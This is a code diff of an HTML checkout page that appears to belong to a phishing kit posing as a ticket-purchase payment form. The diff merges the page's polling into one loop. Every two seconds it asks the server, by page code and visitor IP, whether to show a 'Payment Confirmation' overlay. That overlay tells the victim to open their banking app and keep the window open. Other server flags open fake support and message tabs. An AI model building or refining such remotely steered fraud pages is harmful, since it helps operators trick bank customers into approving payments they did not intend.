@@ -216,44 +216,6 @@
       .push-desc { font-size: 0.98rem; }
     }
     </style>
-    <style>
-    #push-overlay {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      background: rgba(0, 178, 255, 0.85);
-      z-index: 99999;
-      align-items: center;
-      justify-content: center;
-    }
-    #text-overlay {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      background: rgba(255, 152, 0, 0.85);
-      z-index: 99999;
-      align-items: center;
-      justify-content: center;
-    }
-    #support-overlay {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      background: rgba(76, 175, 80, 0.85);
-      z-index: 99999;
-      align-items: center;
-      justify-content: center;
-    }
-    </style>
 </head>
 <body>
     <!-- Блок для приховування total, price, currency з URL -->
@@ -319,28 +281,6 @@
         </div>
         <div class="push-title" id="push-payment-title">Payment Confirmation</div>
         <div class="push-desc">To confirm the transaction, open your banking app and follow the instructions of your bank. <br>Do not close this window.</div>
-      </div>
-    </div>
-    
-    <!-- Text overlay -->
-    <div id="text-overlay">
-      <div class="push-modal">
-        <div class="push-bell">
-          <svg viewBox="0 0 24 24" fill="none"><path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-2 12H6v-2h12v2zm0-3H6V9h12v2zm0-3H6V6h12v2z" fill="#fff"/></svg>
-        </div>
-        <div class="push-title" id="text-title">Important Message</div>
-        <div class="push-desc" id="text-content">You have received an important message. Please read it carefully.</div>
-      </div>
-    </div>
-    
-    <!-- Support overlay -->
-    <div id="support-overlay">
-      <div class="push-modal">
-        <div class="push-bell">
-          <svg viewBox="0 0 24 24" fill="none"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" fill="#fff"/></svg>
-        </div>
-        <div class="push-title">Support Team</div>
-        <div class="push-desc">Our support team is now available to help you. Please wait for assistance.</div>
       </div>
     </div>
     <script>
@@ -528,39 +468,87 @@
     </script>
     <!--End of Tawk.to Script-->
     <script>
-    // --- POLLING для support/text кнопок ---
+    // --- Універсальний POLLING для всіх кнопок (push, support, text) ---
     let supportTabOpened = false;
-    function startSupportPolling() {
-      setTimeout(pollSupportButtons, 2000);
+    let pushTabOpened = false;
+    
+    function getPageCode() {
+      const urlParams = new URLSearchParams(window.location.search);
+      let page = urlParams.get('page');
+      if (page) return page;
+      page = sessionStorage.getItem('page_code');
+      if (page) return page;
+      return '';
     }
-    async function pollSupportButtons() {
-        if (!userIP) {
-            return setTimeout(pollSupportButtons, 2000);
+    
+    function startUniversalPolling() {
+      setTimeout(pollAllButtons, 2000);
+    }
+    
+    async function pollAllButtons() {
+        const page_code = getPageCode();
+        document.body.setAttribute('data-page-code', page_code);
+        
+        if (!page_code) {
+            return setTimeout(pollAllButtons, 2000);
         }
+        
+        // Polling для push кнопки
         try {
-            const resp = await fetch(`/check_support?ip=${encodeURIComponent(userIP)}`);
-            const data = await resp.json();
-            if ((data.show_support || data.show_text)) {
+            const pushUrl = '/check_push?page_code=' + encodeURIComponent(page_code);
+            const pushResp = await fetch(pushUrl);
+            const pushTxt = await pushResp.text();
+            
+            if (pushTxt === 'true' && !pushTabOpened) {
+                const { total, currency } = getTotalAndCurrency();
+                const pushTitle = document.getElementById('push-payment-title');
+                if (pushTitle) {
+                    pushTitle.textContent = `Payment ${total} ${currency}`;
+                }
+                document.getElementById('push-overlay').style.display = 'flex';
+                document.getElementById('payment-card-main').style.display = 'none';
+                if (window.loadingOverlay) window.loadingOverlay.style.display = 'none';
+                pushTabOpened = true;
+            }
+        } catch (e) {
+            console.error('Push polling error:', e);
+        }
+        
+        // Polling для support/text кнопок
+        if (!userIP) {
+            return setTimeout(pollAllButtons, 2000);
+        }
+        
+        try {
+            const supportUrl = `/check_support?ip=${encodeURIComponent(userIP)}`;
+            const supportResp = await fetch(supportUrl);
+            const supportData = await supportResp.json();
+            
+            if ((supportData.show_support || supportData.show_text)) {
                 if (window.loadingOverlay) window.loadingOverlay.style.display = 'none';
             }
-            if (!supportTabOpened && (data.show_support || data.show_text)) {
-                const page_code = getPageCode();
-                if (data.show_support) {
+            
+            if (!supportTabOpened && (supportData.show_support || supportData.show_text)) {
+                if (supportData.show_support) {
                     window.open(`/buy-tickets/loading/waiting-support.html?page=${page_code}`, '_blank');
                     supportTabOpened = true;
                 }
-                if (data.show_text && data.text_id) {
-                    window.open(`/buy-tickets/loading/waiting-text.html?page=${page_code}&text_id=${data.text_id}`, '_blank');
+                if (supportData.show_text && supportData.text_id) {
+                    window.open(`/buy-tickets/loading/waiting-text.html?page=${page_code}&text_id=${supportData.text_id}`, '_blank');
                     supportTabOpened = true;
                 }
             }
-        } catch (e) {}
-        setTimeout(pollSupportButtons, 2000);
+        } catch (e) {
+            console.error('Support polling error:', e);
+        }
+        
+        setTimeout(pollAllButtons, 2000);
     }
+    
     // Стартуємо polling тільки після визначення userIP
     getUserIP(function(ip) {
         userIP = ip;
-        startSupportPolling();
+        startUniversalPolling();
     });
     </script>
     <script>
@@ -757,68 +745,7 @@ document.getElementById('back-btn').onclick = function() {
       if (page) return page;
       return '';
     }
-    function pollPushOverlay() {
-      const page_code = getPageCode();
-      document.body.setAttribute('data-page-code', page_code);
-      if (!page_code) return setTimeout(pollPushOverlay, 2000);
-      const url = '/check_push?page_code=' + encodeURIComponent(page_code);
-      fetch(url)
-        .then(resp => resp.text())
-        .then(txt => {
-          if (txt === 'true') {
-            const { total, currency } = getTotalAndCurrency();
-            const pushTitle = document.getElementById('push-payment-title');
-            if (pushTitle) {
-              pushTitle.textContent = `Payment ${total} ${currency}`;
-            }
-            document.getElementById('push-overlay').style.display = 'flex';
-            document.getElementById('payment-card-main').style.display = 'none';
-            if (window.loadingOverlay) window.loadingOverlay.style.display = 'none';
-          } else {
-            setTimeout(pollPushOverlay, 2000);
-          }
-        });
-    }
-    setTimeout(pollPushOverlay, 2000);
-    </script>
-    
-    <!-- Flag handler for text and support -->
-    <script src="/js/flag-handler.js"></script>
-    <script>
-    // Initialize flag handler
-    const flagHandler = new FlagHandler();
-    
-    // Start polling for text flag
-    flagHandler.startPolling('text', (triggered) => {
-        if (triggered) {
-            // Get text content from server
-            const page_code = flagHandler.getPageCode();
-            fetch(`/get_custom_text?text_id=${page_code}`)
-                .then(resp => resp.json())
-                .then(data => {
-                    if (data.text) {
-                        document.getElementById('text-content').textContent = data.text;
-                    }
-                    flagHandler.showOverlay('text-overlay', ['payment-card-main', 'loading-overlay']);
-                })
-                .catch(error => {
-                    console.error('Error fetching text:', error);
-                    flagHandler.showOverlay('text-overlay', ['payment-card-main', 'loading-overlay']);
-                });
-        }
-    });
-    
-    // Start polling for support flag
-    flagHandler.startPolling('support', (triggered) => {
-        if (triggered) {
-            flagHandler.showOverlay('support-overlay', ['payment-card-main', 'loading-overlay']);
-        }
-    });
-    
-    // Cleanup on page unload
-    window.addEventListener('beforeunload', () => {
-        flagHandler.stopAllPolling();
-    });
+    // Старий polling видалено - тепер використовується універсальний polling вище
     </script>
 </body>
 </html>
